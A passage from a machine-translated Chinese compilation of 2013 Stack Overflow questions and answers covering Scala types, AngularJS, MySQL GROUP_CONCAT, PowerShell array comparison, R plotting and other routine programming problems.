myBar: myFoo.Bar = $anon$2@70415924

scala> class Whatever6Aux[F <: Foo](val foo: F) { def apply(bar: foo.Bar) = bar }
defined class Whatever6Aux

scala> def whatever6(foo: Foo) = new Whatever6Aux[foo.type](foo)
whatever6: (foo: Foo)Whatever6Aux[foo.type]

scala> import scala.language.existentials
import scala.language.existentials

scala> whatever6(myFoo)(myBar)
res0: _1.foo.Bar forSome { val _1: Whatever6Aux[<refinement>.type] } = $anon$2@70415924 
```

# python - 注册程序

> ID：15510203
> 
> 赞同：0
> 
> 时间：2013-03-19T20:52:19.413
> 
> 标签：python

我正在尝试制作一个简单的注册程序，但我似乎无法让它在用户注册时保存信息，因此当他们登录时，那里的帐户已经注册。并且由于某种原因`("Password: ")`不会出现。？顺便说一句，这将是一个离线注册，所以我可以为数据库使用 .txt 文件或其他东西吗？

```
username = raw_input("Create a new username: ")
password = raw_input("Create a password: ")
firstname = raw_input("What's your first name?: ")
lastname = raw_input("What's your last name?: ")
phonenumber = raw_input("Enter your phone number.: ")
print "Thank you for signing up!"
signin = raw_input("Username: ")("Password: ") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T20:59:19.470

我可能在这里遗漏了一些东西，但一般来说，为了保存用户，您需要某种数据库。现在，由于它的含义，数据库可能是一个可怕的词，但它可以有多种形式。如果您正在构建一个 Web 应用程序，您可以使用 mySQL 数据库之类的东西，但是在 python 应用程序中（尤其是对于类而言），您可能希望使用某种基于文本的文件（纯文本或 csv文件），或者如果不需要持久性，您可以使用数组/向量。

不幸的是，如果没有更多的上下文，我不确定其中任何一个能有多大帮助，但我建议你开始阅读我上面提到的一些方法。网上有各种各样的资源可以帮助你完成我提到的任何方法。这是一篇不错的文章，可能是一个很好的起点：[http ://www.tutorialspoint.com/python/python_files_io.htm](http://www.tutorialspoint.com/python/python_files_io.htm)

希望这可以帮助！

# facebook - Flash +remove via AMFPHP +internet explorer 8 + live

> ID：15510205
> 
> 赞同：0
> 
> 时间：2013-03-19T20:52:28.420
> 
> 标签：facebook, actionscript-3, flash, internet-explorer-8, amfphp

对于我的生活，我无法弄清楚这一点。好的，这就去。我在实时服务器上有一个 Facebook 游戏，它适用于 Chrome、FF 和 Internet Explorer 9+10，但不适用于 Internet Explorer 8。我使用 AMFPHP 并接收 Flash 游戏的所有数据。另一点是 ie8 它确实可以在我的本地服务器上运行 - 但同样不能在实时服务器上运行，而所有其他浏览器和版本都可以在实时服务器上运行。

我确实注意到加载 Flash 时 ie8 相当慢。我也尝试过其他计算机，但它只是实时服务器上的 ie 8 问题。有任何想法吗？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T08:54:57.920

如果它在本地工作但不能在您的实时服务器上工作，那么听起来您有服务器问题而不是 ie8 问题。请参阅 [http://www.silexlabs.org/amfphp/documentation/troubleshooting-and-debugging-your-project/](http://www.silexlabs.org/amfphp/documentation/troubleshooting-and-debugging-your-project/) （特别是获取有关 PHP 错误的信息）

[http://www.silexlabs.org/amfphp/documentation/using-a-packet-sniffer/](http://www.silexlabs.org/amfphp/documentation/using-a-packet-sniffer/)也 可以用来查看 ie8 发生了什么

# docx4j - 如何在 docX 中插入椭圆（圆）？

> ID：15510208
> 
> 赞同：0
> 
> 时间：2013-03-19T20:52:30.353
> 
> 标签：docx4j

我试图在没有成功的情况下在 docx 中插入一个椭圆。可以使用 docx4j 在 docx 中添加椭圆吗？我还尝试使用 org.docx4j.XmlUtils.unmarshalString 插入 XML“.....”，但我收到了一些错误。

有人试过吗？

# actionscript-3 - Actionscript 中接口的主要功能是什么？

> ID：15510210
> 
> 赞同：2
> 
> 时间：2013-03-19T20:52:40.850
> 
> 标签：actionscript-3, flash, actionscript

我知道包是类和接口的集合，旨在组织和分类其内容。我也知道类是对象的定义，以及它们的指令、它们的属性/变量以及它们的函数/方法。

但是，我还没有理解接口是什么，或者它的真正用途是什么......

我在 Adob​​e 的网站上阅读了这个定义..：

> **界面**
> 
> > 用法
> > 
> > > > `interface InterfaceName [extends InterfaceName ] {}`
> > 
> > 定义一个接口。接口是定义一组方法的数据类型；方法必须由实现该接口的任何类定义。
> > 
> > 接口类似于类，但有以下重要区别：
> > 
> > > • 接口只包含方法的声明，而不包含它们的实现。也就是说，每个实现接口的类都必须为接口中声明的每个方法提供一个实现。
> > > 
> > > •`Interface`方法定义不能有任何属性，例如`public`or `private`，但实现的方法必须`public`在实现接口的类的定义中标记。
> > > 
> > > • 多个接口可以通过`extends`语句由接口继承，也可以通过语句由类继承`implements`。
> > 
> > 与 ActionScript 2.0 不同，ActionScript 3.0 允许在接口定义中使用 getter 和 setter 方法。

...但是，这太模糊了，对我没有帮助。

有谁知道 ActionScript 中接口的目的和正确实现和/或设计？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-19T22:00:32.520

接口基本上让你宣布“这个类可以做这些事情”。

作为一个真实世界的例子，您可能想要制作一个游戏教程，逐个突出显示屏幕上的每个不同控件。每个控件可能会闪烁或反弹以突出显示自己，因此您可以说它们实现了一个“ `IHighlightable`”接口，并让它们处理其余的事情：

```
public interface IHighlightable {

    function highlight():void;

} 
```

然后在您的控件中：

```
public class Control implements IHighlightable {

    public function highlight():void {
        // Bounce and flash!
    }

} 
```

这意味着您可以执行以下操作：

```
private function highlightControl(tutorialItem:IHighlightable):void {

    tutorialItem.highlight();

} 
```

重要的是，您可以让一个类实现多个接口，这在类共享能力时很有用，但让它们都扩展一个公共基类是没有意义的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T03:50:34.660

接口是一种*契约*。它是强制你*实现*方法的编译时机制。在大型 OOP 代码库中，让其他类依赖于接口而不是其他类是最佳实践，因此您可以在不更改使用接口的代码的情况下交换实现（这个优势在实践中是可忽略的，因为接口通常也会改变）。

我相信接口是从 Java 中借来的，Java 引入了它们来实现*多态*（`ClassA`可以是类型`IFoo`并且`IBar`同时），而不是从多个抽象类继承（你只能扩展一个类，但你可以实现任意数量的接口）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T22:36:51.797

虽然我在技术上是错误的，但我认为接口类似于 C++ 抽象类。

*   [维基百科关于抽象类型的文章](http://en.wikipedia.org/wiki/Abstract_type)
*   [关于摘要的 Oracle Java 文档](http://docs.oracle.com/javase/tutorial/java/IandI/abstract.html)
*   [关于 C# 接口的 MSDN 文章](http://msdn.microsoft.com/en-US/library/vstudio/ms173156.aspx)

* * *

接口旨在定义属性和方法，而无需实际实现它们。此外，它们不能被实例化

```
var test:FooInterface = new FooInterface() // would error 
```

# jquery - 将 JQuery Dialog 值获取到代码背后的问题

> ID：15510211
> 
> 赞同：0
> 
> 时间：2013-03-19T20:52:43.927
> 
> 标签：jquery, asp.net, jquery-ui-dialog

我有一个简单的模态 jQuery 对话框弹出窗口，它收集地址信息，我需要将这些信息传递给后面的代码，以便在用户输入后保存到数据库中。我已经搜索了数百个示例，并且在以下点是最新的，但似乎无论我做什么，创建的 JSON 字符串对于我试图传递的所有字段都显示“未定义”。我的结论是，我用来在 jQuery 中构建 JSON 字符串的方法是错误的，但是在尝试了许多不同的方法之后，它们都不起作用。我尝试通过 ID 访问字段，但如下所示，通过 ID 使用各种方式访问​​字段。以下是代码片段。谁能看到我哪里出错了？

```
<script type="text/javascript">
    $(function () {
        $('#dialog').dialog({
            draggable: true,
            resizeable: false,
            autoOpen: false,
            height: 700,
            width: 550,
            modal: true,
            top: 0,
            left: 0,
            title: 'Edit Information',
            buttons: {
                'Save': function () {                        
                    $('#ibSaveInfo').click();
                },
                'Cancel': function () {
                    $(this).dialog('close');
                }
            }
        }).parent().css('z-index', '1005');
    });

    $(document).on("click", "#ibSaveInfo", function () {
        var inputArray = new Array;
        var idx = 0;

        inputArray[idx] = 'Address1:' + $("#dialog").find("#txtAddress1").val();

        idx++;
        inputArray[idx] = 'Address2:' + $("#txtAddress2").val();

        idx++;
        inputArray[idx] = 'city:' + $("txtcity").val();

        etc, etc

        var inputArrayList = "{ inputArray: " + JSON.stringify(inputArray) + "}";
        $.ajax({
            type: "POST",
            dataType: "json",
            contentType: "application/json",
            url: "Address.aspx/SaveInfo",
            data: inputArrayList,
            success: function (data) {
                //debugger;

                if (data.d.indexOf("Error") != -1) {
                }
                else {
                    $("#ResultLabel").show();
                    $("#ResultLabel").text("Sum of all the contents is: " + data.d);
                }
            },
            error: function (e, ts, et) {
                //debugger;
                alert(ts);
            }
        }); //ajax func end
    });

    $(document).ready(function () {
        $("#ibEdit").click(function (e) {
            $('#dialog').dialog('option', 'position', [e.pageX + 10, e.pageY + 10]);
            $('#dialog').dialog('open');
        });
    });

<div id="dialog" style="padding-left: 10px; padding-bottom: 15px;">
    <asp:TextBox runat="server" ID="txtAddress1" ClientIDMode="Static" />
    <asp:TextBox runat="server" ID="txtAddress2" ClientIDMode="Static" />
    <asp:TextBox runat="server" ID="txtCity" ClientIDMode="Static" />
    etc, etc
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:38:21.810

我刚刚为您的确切代码创建了一个 jsFiddle：

[http://jsfiddle.net/PfgQy/](http://jsfiddle.net/PfgQy/)

它似乎与`city`表单字段的例外一起工作，因为它缺少 # 并且它的大小写不正确（应该有一个大写 C）。

```
$("#txtCity").val(); 
```

如果您的所有字段仍然损坏，那么是您未提供的页面上的其他内容导致了问题。

希望这可以帮助。

戴夫

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:38:59.083

编辑：刚刚注意到您使用的是 asp 文本框。随着 asp 元素的 ID 发生变化。`<input>`如果您不打算从服务器访问这些值，请尝试使用常规文本框。

而不是这个

```
idx++;
        inputArray[idx] = 'city:' + $("txtcity").val(); 
```

你应该只使用 array.push 函数。

```
var inputArray = [];
inputArray.push('Address1:' + $("#txtAddress1").val());
inputArray.push('Address2:' + $("#txtAddress2").val();)
inputArray.push('city:' + $("txtcity").val()); 
```

也在这里，而不是在代码中调用 clickfunction，只需给它引用另一个函数

```
$(function () {
        $('#dialog').dialog({
            draggable: true,
            resizeable: false,
            autoOpen: false,
            height: 700,
            width: 550,
            modal: true,
            top: 0,
            left: 0,
            title: 'Edit Information',
            buttons: {
                'Save': save(),
                'Cancel': function () {
                    $(this).dialog('close');
                }
            }
        }).parent().css('z-index', '1005');
    });

function save(){
  var inputArray = [];
  inputArray.push('Address1:' + $("#txtAddress1").val());
  inputArray.push('Address2:' + $("#txtAddress2").val());
  inputArray.push('city:' + $("#txtCity").val()); 
  var json = { "inputArray": inputArray};
        inputArrayList = JSON.stringify(json);
//ajax stuff
} 
```

您还有 2 个文档就绪功能，因此您可以将它们组合起来。这两种方式都是声明文档就绪的方式。

```
$(document).ready(function(){});
$(function () {}); 
```

# .net - 如何在长时间的外部操作期间更新 ProgressBar？

> ID：15510212
> 
> 赞同：0
> 
> 时间：2013-03-19T20:52:45.647
> 
> 标签：.net, progress-bar, backgroundworker

在我的 .NET 应用程序中，我正在将一个大型 SQL 表读入内存，并且我希望`ProgressBar`应用程序的窗口中的 至少在某些情况下在`SqlDataAdapter.Fill()`操作被阻塞时进行。我已经`Fill()`在对象的后台线程中进行了`BackgroundWorker`调用，并且我尝试在调用但不起作用`ProgressBar`的前台线程中更新该调用。`RunWorkerAsync()`这里有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:54:44.190

看到您无法直接从 Dataset.Fill 获得进展并使用 OnRowUpdate / OnRowUpdated 是很痛苦的，除非您发现应该更新多少行，否则您仍然无法完成 %。

还不如在那里敲一个计时器并在填充任务运行时更新一些动画。

作为旁注，我们编写了一个小动画组件，它在它自己的线程中运行，您传递您想要在线程中执行的方法。很好地把它包起来，你可以把东西放在一个 using 块里，一切都干净整洁。适用于火和忘记线程，你也可以做一个模态版本。

# java - 绘制到屏幕时纹理变形

> ID：15510213
> 
> 赞同：0
> 
> 时间：2013-03-19T20:52:46.747
> 
> 标签：java, opengl, lwjgl

我正在尝试在屏幕上绘制 HUD。我目前有它根据玩家的健康状况显示心。图像是透明的，我已启用 `glEnable(GL_BLEND);` 并 `glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);`

代码：

```
public void drawHUD() {
    for(int i = 1; i <= p.getHealth(); i++) {
        heart.bind();
        float y = 30;
        float x = 35 * i;
        glPushMatrix();
        glBegin(GL_QUADS);
            glTexCoord2f(0, 0);
            glVertex2f(x, y);
            glTexCoord2f(0, 1);
            glVertex2f(x + w.block_size, y);
            glTexCoord2f(1, 1);
            glVertex2f(x + w.block_size, y + w.block_size);
            glTexCoord2f(0, 1);
            glVertex2f(x, y + w.block_size);
        glEnd();
        glPopMatrix();
    }
} 
```

心：

![在此处输入图像描述](../Images/47d4ee38b9ff88d42e5e4e87af7f3883.png)

绘制时：

![在此处输入图像描述](../Images/1736406895fea0604e28659bcf7fc542.png)

（纹理为 32x32）

# php - 使用 Splice() 获取正确的索引

> ID：15510215
> 
> 赞同：1
> 
> 时间：2013-03-19T20:52:53.990
> 
> 标签：php, jquery, arrays, angularjs, splice

我正在尝试从我的 AngularJS 视图中删除项目。从视图中，我传递了索引和 ID。在 JS 控制器中，我从 AngularJS 数组/模型中*拼接（索引） 。*我将 ID 传递给*$http.get*以调用对我的数据库的删除。这一切都有效。

……

直到我请求刷新我的页面。每 5 秒我都会请求更新 Angular 模型，并将任何新数据连接到它。但我发现它搞砸了我的指数值。我以为它正在重新排序我的索引：阅读[这个 StackOverflow 线程](https://stackoverflow.com/questions/12461133/why-does-the-splice-method-have-this-strange-behavior)有助于确认这一点。

会发生什么我为页面上的第三个项目推送删除，它从数据库中删除了该 ID。但它会从页面拼接错误的项目，直到我刷新页面。 **如何确保始终传递正确的索引？**

***看法***

```
<li ng-repeat="new in news | filter:query | orderBy:orderProp">
     <div class="newsitem" id="newspost{{new.id}}">
         <h4 ng-model="news.title">{{new.title}} </h4>
         <p ng-model="news.text">{{new.text}}</p>
         <a class="btn btn-info" ng-click="visible = true">View article</a>
         <a ng-click="deleteNews(index,new.id)" class="btn btn-danger btn-mini">Delete</a>
     </div>
</li> 
```

***控制器.js***

```
$scope.deleteNews = function(index, id) {
    $http.get('/ci/index.php/news/delete_news_ajax/'+id).success(function(){
        $scope.news.splice(index, 1);
    });
}; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:02:04.020

而不是传递索引和 id，而是传递`new`：

```
<a ng-click="deleteNews(new)" ...> 
```

然后`indexOf`在您的控制器功能中使用：

```
$scope.deleteNews = function(newsItem) {
   $http.get('/ci/index.php/news/delete_news_ajax/' + newsItem.id)).success(function() {
      $scope.news.splice($scope.news.indexOf(newsItem), 1);
   });
} 
```

# c# - 为什么这个多余的逗号会编译？

> ID：15510219
> 
> 赞同：3
> 
> 时间：2013-03-19T20:53:02.083
> 
> 标签：c#, enums

在查看一些遗留代码时，我遇到了这个枚举：

```
 public enum cmdResults 
    {
        cmdNotFound = 0,    
        cmdFound    = 1,    
        cmdExit     = 2,    
        cmdSuccess  = 3,    
        cmdFail     = 4,    
        cmdTimeout  = 5,    
        cmdProcess  = 6,
        cmdAddTime  = 7,
    }; 
```

在注意到最后一个枚举成员后面的逗号时，我惊呆了；我删除了它，并且正如预期的那样，它仍然编译。但为什么它*与*最后的逗号一起工作？

（这并没有提到对我来说奇怪的成员排序；我要么在索引 0 处放置一个新的“cmdNothing”，要么至少让“cmdFail”占据那个位置）

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-19T20:55:32.987

因为 C# 编译器编写者选择在末尾使可选逗号成为有效语法。

我非常喜欢这一点，因为这意味着您不需要对最后一行进行特殊处理。您可以复制粘贴行，在任何位置（包括末尾）添加新行而不考虑它的位置，删除行而不需要修复逗号等。允许多余的逗号不会引入歧义或其他问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-19T20:55:29.840

它可以编译，因为它是合法的语法。

# mysql - MYSQL GROUP_CONCAT 和 IN

> ID：15510220
> 
> 赞同：0
> 
> 时间：2013-03-19T20:53:04.800
> 
> 标签：mysql, group-concat

我有一个小问题，它是这样的：

它比看起来稍微复杂一些，唯一的问题是使用一个子查询的输出作为 IN 子句的参数来生成另一个子查询。它在某种程度上有效 - 但它只提供“IN”子句中第一个 id 的结果。奇怪的是，如果我手动插入记录 ID“00003,00004,00005”，它确实会给出正确的结果。

我想要做的是获得二级多对多关系 - 基本上 tour_stops 有项目，而这些项目又有图像。我正在尝试将所有项目中的所有图像作为“item_images”放在 JSON 字符串中。如前所述，它运行得很快，但只返回第一个相关项目的图像。

```
SELECT DISTINCT
    tour_stops.record_id,
    (SELECT 
       GROUP_CONCAT( item.record_id ) AS in_item_ids
       FROM tour_stop_item
       LEFT OUTER JOIN item
       ON item.record_id = tour_stop_item.item_id
       WHERE tour_stop_item.tour_stops_id = tour_stops.record_id
       GROUP BY tour_stops.record_id
       ) AS rel_items,
    (SELECT 
       CONCAT('[ ',
       GROUP_CONCAT(
       CONCAT('{ \"record_id\" : \"',record_id,'\",
                 \"photo_credit\" : \"',photo_credit,'\" }')
       )
       ,' ]')
       FROM images 
       WHERE 
       images.attached_to IN(rel_items) AND
       images.attached_table = 'item'
       ORDER BY img_order ASC) AS item_images
    FROM tour_stops             
    WHERE
    tour_stops.attached_to_tour = $record_id    
    ORDER BY tour_stops.stop_order ASC 
```

我尝试了以下两个答案，但没有帮助。第二个示例（将整个第一个子查询放在他的“IN”语句中）不仅产生了我已经得到的相同结果，而且还成倍地增加了查询时间。

编辑：我将我的 IN 语句替换为

```
IN(SELECT item_id FROM tour_stop_item WHERE tour_stops_id = tour_stops.record_id) 
```

它可以工作，但现在速度非常慢。假设我已正确索引所有内容，这是最好的方法吗？

[在 PHPMYADMIN 中使用 group_concat 将结果显示为 [BLOB - 3B]](https://stackoverflow.com/questions/2133936/using-group-concat-in-phpmyadmin-will-show-the-result-as-blob-3b)

[IN 子查询中的 GROUP_CONCAT](https://stackoverflow.com/questions/6403074/group-concat-in-in-subquery)

任何见解都值得赞赏。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:56:49.590

我很惊讶您可以`rel_items`在子查询中使用。

你可以试试：

```
 concat(',', images.attached_to, ',') like concat('%,', rel_items, ',%') and 
```

这可能会也可能不会更快。原始版本可能很快，因为没有匹配项。

或者，您可以尝试更改您的`in`条款。有时，这些优化不佳：

```
exists (select 1
        from tour_stop_item
        where tour_stops_id = tour_stops.record_id and images.attached_to = item_id
       ) 
```

然后确保你有一个索引`tour_stop_item(tour_stops_id, item_id)`。

# r - R barplot 图例在中心

> ID：15510228
> 
> 赞同：3
> 
> 时间：2013-03-19T20:53:33.143
> 
> 标签：r, plot, legend

我有一个条形图，如下所示： ![在此处输入图像描述](../Images/22e3d79a42ac6e85cbe53c6611872e4b.png)

我想在粗体矩形的某处添加一个图例，我已经尝试过 par(xpd=TRUE) 并为第四个条形图设置边距，但由于某些原因我无法让它工作......

因此，如果您有任何想法，请告诉我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:02:36.053

不知道为什么`xpd`不适合你，但下面的代码应该给你一些线索：

```
par(mfrow=c(2,2), xpd=TRUE)
barplot(tN, col = 2:3)
barplot(tN, col = 2:3)
barplot(tN, col = 2:3)
barplot(tN, col = 2:3)
legend(-4.5, 56,  c("A", "B"), col=2:3,lwd=1) 
```

为了了解图例的坐标，我使用了该`locator()`函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:30:59.447

你可以`layout`在这里使用，有不同的高度 ![在此处输入图像描述](../Images/a9aefc49eb17c7cefaaa7e4613cbb697.png)

```
layout(rbind(c(1, 2),
             c(3, 3),
             c(4, 5)),
       heights=c(3, 1.5, 3),
       respect=FALSE)
tN <- table(Ni <- stats::rpois(100, lambda = 5))
barplot(tN, col = 2:3)
barplot(tN, col = 2:3)
plot.new()
#box()
text(0.5,0.5,'legend in center',cex=3)
barplot(tN, col = 2:3)
barplot(tN, col = 2:3) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:05:52.890

尝试`locator {graphics}`

```
?locator

legend(locator(1), border=FALSE, fill=FALSE, "try the position") 
```

在你的情节（）之后，你可以在你想要的位置上点击你的情节窗口

# objective-c - 在 Obj-c 中将对象放回 Nill？

> ID：15510231
> 
> 赞同：-4
> 
> 时间：2013-03-19T20:53:46.653
> 
> 标签：objective-c

我正在使用它来查看我是否已经开始使用对象..

```
if(!sharedInstance.market) 
```

但是当我处理完该对象后，它已从显示中删除，我想将 sharedInstance.market 设置回 Nill，这样我可以在需要时再次设置它，但这会导致 XCode 中出现错误

```
sharedInstance.market = Nill; 
```

如何将其设置回 Nill？还是我想错了？

*编辑*

它给了我2个错误和一个警告..

> /Classes/Game.m:241:29：使用未声明的标识符“Nill”；你的意思是“杀”吗？
> 
> /Classes/Game.m:241:29：ARC 不允许将非 Objective-C 指针类型“int (*)(pid_t, int)”隐式转换为“SKMarket *”
> 
> /Classes/Game.m:241:27：不兼容的指针类型从“int（pid_t，int）”分配给“SKMarket *”

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T20:58:30.633

我认为你的意思是：

```
sharedInstance.market = nil; 
```

# jquery - 粘性表头不起作用

> ID：15510235
> 
> 赞同：2
> 
> 时间：2013-03-19T20:54:14.143
> 
> 标签：jquery, sticky

我正在尝试使用stickyTableHeader 使我的表格标题在您滚动表格时保持静态，但由于某种原因它无法正常工作。我放置了来自[stickyTableHeaders的代码](https://github.com/jmosbech/StickyTableHeaders/blob/master/js/jquery.stickytableheaders.js)

进入一个 js 文件，`$(function(){ $("table").stickyTableHeaders(); });`在文件的顶部，但由于某种原因，我的表没有任何反应。我在我的 index.html 中初始化了它，`<script src="pathtofile"></script>`我知道这是正确的。有什么帮助吗？

我正在使用角度动态加载我的表的数据，那么这会与表本身的 jquery 初始化冲突吗？就像，jquery 不知道表在那里还是什么？（当然，在我用来调用正文的单独 html 文件中，它包含表结构，只是数据来自角度调用。

*注意：它还会调整表格标题的宽度，我不知道为什么，如果有人为我指出正确的方向*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:12:01.157

听起来调用`$("table").stickyTableHeaders();`太快了，可能在角度加载内容之前。同样在仔细检查stickyTableHeaders插件时，似乎没有为委托设置点击事件，因此他们只会在浏览器最初加载页面时找到页面中的html。您可能必须对其进行自定义才能使其正常工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-11-03T07:07:37.560

用这个：

```
 <script src="https://cdnjs.cloudflare.com/ajax/libs/sticky-table-headers/0.1.24/js/jquery.stickytableheaders.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/sticky-table-headers/0.1.24/js/jquery.stickytableheaders.min.js"></script>
   <script type="text/javascript" src="http://example.com/js/jquery.sticky.js"></script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-08-25T22:16:45.417

我需要让 jmosbech 的 StickyTableHeaders 工作的两个脚本元素是：

```
 <script type="text/javascript" src="https://code.jquery.com/jquery-1.9.1.js"></script>
    <script type="text/javascript" src="https://unpkg.com/sticky-table-headers"></script> 
```

# web-services - REST API 的目录结构

> ID：15510238
> 
> 赞同：3
> 
> 时间：2013-03-19T20:54:18.887
> 
> 标签：web-services, api, rest, data-structures, directory

我们应该如何构建我们的 REST API？

示例结构

```
app/
  v1/
    controllers/
      c1_controller
      c2_controller
    models/
      m1
      m2
    views/
      view1
      view2
  v2/
    controllers/
      c1_controller
      c2_controller
    models/
      m1
      m2
    views/
      view1
      view2 
```

您将如何将 CRUD 添加到此结构中？

CRUD === 行动？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T09:04:18.960

您在问题中提到的是一个普通的 MVC 结构。基于 REST 的应用程序的目录结构不必与 MVC 布局不同。

要使您的应用程序 RESTful，您需要在控制器中添加基于动词的操作。

如果您有一个 UserController，您将有四个操作 - GET、POST、PUT、DELETE

```
POST v1/user/  --would create a new user
GET v1/user/   --would return all users
PUT v1/user/   --would update all users
DELETE v1/user/   --would delete all users

POST v1/user/123  --would do nothing or throw error
GET v1/user/123   --would return User with ID 123
PUT v1/user/123   --would update User with ID 123
DELETE v1/user/123   --would delete User with ID 123 
```

当您使用 Zend Framework 等框架构建应用程序时，它会根据方法将您的 URL 重定向到适当的操作。

# visual-studio - 将 SharePoint 应用程序页面发布到远程服务器

> ID：15510241
> 
> 赞同：1
> 
> 时间：2013-03-19T20:54:28.407
> 
> 标签：visual-studio, sharepoint, deployment, remote-server

我创建了一个 SharePoint 应用程序页面。我选择了 Deploy as a Farm 解决方案，并且能够使应用程序页面正常工作并部署在本地（开发）SharePoint 服务器上。但显然我无法将农场解决方案部署（发布）到远程（用户）服务器。我的要求是我需要实现 SharePoint 应用程序页面并将它们部署到远程服务器。但我的问题是，如果我选择农场解决方案，我可以实现应用程序页面但不能发布到远程服务器。但是当我选择沙盒解决方案时，我没有创建应用程序页面的选项，模板显示应用程序页面（仅限农场解决方案）。我在这里想念什么？为什么页面类型与部署目标相关？

我正在使用 Visual Studio 2012 和 SharePoint 2013。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-08T17:35:09.907

您可能需要使用 powershell 将其打包并从远程服务器部署：http: [//patrickboom.wordpress.com/2010/05/31/using-powershell-to-deploy-sharepoint-solutions-wsp-2/](http://patrickboom.wordpress.com/2010/05/31/using-powershell-to-deploy-sharepoint-solutions-wsp-2/)

# arrays - Powershell：使用 -notcontains 比较数组找不到不匹配的值

> ID：15510244
> 
> 赞同：0
> 
> 时间：2013-03-19T20:55:01.333
> 
> 标签：arrays, powershell, contains

PS noob 在这里（很快就会很明显），但努力变得更好。在我的 Exchange 2010 环境中，我导入和导出大量 .pst 文件。许多人会随机无法排队，一旦他们不在队列中，对源文件进行排序以确定哪些需要再次运行是非常乏味的，所以我正在尝试编写一个脚本来完成它。

首先，我在 pst 文件列表上运行一个目录，并用帐户的关联别名填充一个变量：

```
$vInputlist = dir $vPath -Filter *.pst |%{ get-mailbox -Identity $_.basename| select alias} 
```

然后我用所有成功排队的文件/帐户的别名填充一个变量：

```
$vBatch = foreach ($a in (Get-MailboxImportRequest -BatchName $vBatchname)) {get-mailbox $a.mailbox | select alias} 
```

然后我比较这两个数组，看看哪些文件需要再次排队：

```
foreach($should in $vInputlist){if ($vBatch -notcontains $should){Write-Host $should ""}} 
```

看起来很简单，但数组中的值永远不会匹配，或者不匹配，视情况而定。我已经尝试过 -contains 和 -notcontains。在将变量导出到屏幕和/或 csv 文件的过程中，我进行了一些完整性检查，并且数据看起来很好。

例如，当第一次填充 $vInputlist 时，我将它发送到屏幕，它看起来像这样：

```
Alias
MapiEnableTester1.psiloveyou.com
MapiEnableTester2.psiloveyou.com
MapiEnableTester3.psiloveyou.com
MapiEnableTester4.psiloveyou.com 
```

然而，我在上面显示的最后一行代码 (..write-host $should,"") 将输出：@{Alias=MapiEnableTester1.psiloveyou.com} @{Alias=MapiEnableTester2.psiloveyou.com} @{Alias=MapiEnableTester3 .psiloveyou.com} @{Alias=MapiEnableTester4.psiloveyou.com}

（这些都显示为一列，不知道为什么他们不会在这里显示）

我试过像这样声明数组 $vInputlist = @()

我尝试过使用 .replace 清除 $_.basename 中的 .pst 而不是搜索别名

我已经搜索了比较数组，直到我手指发青，我认为我的比较没有错，我相信无论我如何填充这些变量，我都会破坏或更改数据，以便看似简单地匹配数据没有。

任何帮助将不胜感激。TIA

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:11:54.510

用于`-contains`比较对象并不容易，因为对象永远不会相同，即使它们具有相同的属性和相同的值。当你使用时，`select alias`你会得到一个带有属性的 pscustomobjects 数组`alias`。

尝试使用`-expand`参数 in `select`，例如

```
select -expand alias 
```

Using`-expand`将提取 alias 属性的值，而您的列表将是两个字符串数组，可以使用`-contains`and进行比较`-notcontains`。

**更新**我添加了一个示例来向您展示您的代码发生了什么。

```
#I'm creating objects that are EQUAL to the ones you have in your code
#This will simulate the objects that get through the "$vbatch -notcontains $should" test
PS > $arr = @()
PS > $arr += New-Object psobject -Property @{ Alias="MapiEnableTester1.psiloveyou.com" }
PS > $arr += New-Object psobject -Property @{ Alias="MapiEnableTester2.psiloveyou.com" }
PS > $arr += New-Object psobject -Property @{ Alias="MapiEnableTester3.psiloveyou.com" }
PS > $arr | ForEach-Object { Write-Host $_ }

@{Alias=MapiEnableTester1.psiloveyou.com}
@{Alias=MapiEnableTester2.psiloveyou.com}
@{Alias=MapiEnableTester3.psiloveyou.com}

#Now this is what you will get if you use "... | select -expand alias" instead of "... | select alias"
PS > $arrWithExpand = $arr | select -expand alias
PS > $arrWithExpand | ForEach-Object { Write-Host $_ }

MapiEnableTester1.psiloveyou.com
MapiEnableTester2.psiloveyou.com
MapiEnableTester3.psiloveyou.com 
```

# java - 在 Java 中读取 tiff 图像堆栈

> ID：15510246
> 
> 赞同：1
> 
> 时间：2013-03-19T20:55:13.663
> 
> 标签：java, image, stack, tiff

我有一个视频文件，它是一系列`.tif`图像。视频本身是 RGB 视频的 R，因此像素值为`int`。我需要将每个图像打开为一个 int 像素数组。我可以打开 tiff 文件，但这是一大堆图像。

具体来说，我的问题是：有谁知道如何将`.tif`图像序列（堆栈）表示为用`frame, x_pos, y_pos`Java 索引的 3D 数组？感谢您的任何指点！

# android - 使用幻灯片菜单：向后滑动和填充不起作用

> ID：15510247
> 
> 赞同：3
> 
> 时间：2013-03-19T20:55:14.427
> 
> 标签：android, slidingmenu

我在我的应用程序中为我的滑动菜单 ( [https://github.com/bk138/LibSlideMenu](https://github.com/bk138/LibSlideMenu) ) 使用以下库。

